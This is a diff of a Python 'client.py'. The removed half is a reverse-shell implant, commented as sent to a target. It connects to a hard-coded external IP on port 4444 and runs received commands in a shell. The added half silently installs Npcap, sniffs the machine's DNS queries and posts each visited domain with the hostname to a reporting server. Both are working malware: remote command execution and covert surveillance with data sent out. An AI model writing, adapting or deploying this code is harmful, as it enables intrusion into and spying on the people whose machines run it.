@@ -1,79 +1,45 @@
-# client.py - This gets compiled and sent to target
-import socket
 import subprocess
-import os
-import sys
-import time
+from scapy.all import sniff, DNSQR
+import socket
+import requests
+import threading
 
-def connect_to_server(server_ip, server_port):
-    max_retries = 5
-    retry_delay = 10
-    
-    for attempt in range(max_retries):
-        try:
-            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client.connect((server_ip, server_port))
-            return client
-        except Exception as e:
-            if attempt < max_retries - 1:
-                time.sleep(retry_delay)
-            else:
-                return None
+hostname = socket.gethostname()
+server_url = "http://localhost/report.php"
+visited_domains = set()
 
-def main():
-    # Configure these for your test environment
-    SERVER_IP = "27.34.66.37"  # Replace with your IP
-    SERVER_PORT = 4444
-    
-    client = connect_to_server(SERVER_IP, SERVER_PORT)
-    if not client:
-        sys.exit()
-    
+def install_npcap_silently():
     try:
-        while True:
-            # Receive command prompt
-            prompt = client.recv(1024).decode()
-            
-            # Receive command
-            command = client.recv(1024).decode().strip()
-            
-            if command.lower() == 'exit':
-                break
-            elif command.startswith('cd '):
-                try:
-                    os.chdir(command[3:])
-                    response = f"Changed to: {os.getcwd()}"
-                except Exception as e:
-                    response = f"Error: {str(e)}"
-                client.send(response.encode())
-            elif command == 'sysinfo':
-                import platform
-                info = f"""
-System: {platform.system()}
-Node: {platform.node()}
-Release: {platform.release()}
-Version: {platform.version()}
-Machine: {platform.machine()}
-Processor: {platform.processor()}
-Current Directory: {os.getcwd()}
-User: {os.getenv('USERNAME', os.getenv('USER', 'Unknown'))}
-                """
-                client.send(info.encode())
-            else:
-                try:
-                    # Execute command
-                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
-                    output = result.stdout + result.stderr
-                    if not output:
-                        output = "Command executed (no output)"
-                    client.send(output.encode())
-                except Exception as e:
-                    client.send(f"Error: {str(e)}".encode())
-                    
-    except Exception as e:
+        result = subprocess.run(["sc query npcap"], shell=True, capture_output=True, text=True)
+        if "FAILED" in result.stdout or "does not exist" in result.stdout or "not recognized" in result.stdout:
+            subprocess.run(["npcap.exe", "/S"], shell=True)
+    except:
         pass
-    finally:
-        client.close()
+
+def send_to_server(domain):
+    payload = {
+        "hostname": hostname,
+        "domain": domain
+    }
+    try:
+        requests.post(server_url, json=payload)
+    except:
+        pass
+
+def packet_callback(packet):
+    if packet.haslayer(DNSQR):
+        domain = packet[DNSQR].qname.decode().rstrip('.')
+        if domain not in visited_domains:
+            visited_domains.add(domain)
+            send_to_server(domain)
+
+def start_sniffing():
+    sniff(filter="udp port 53", prn=packet_callback, store=0)
 
 if __name__ == "__main__":
-    main()
+    install_npcap_silently()
+    t = threading.Thread(target=start_sniffing)
+    t.daemon = True
+    t.start()
+    while True:
+        pass
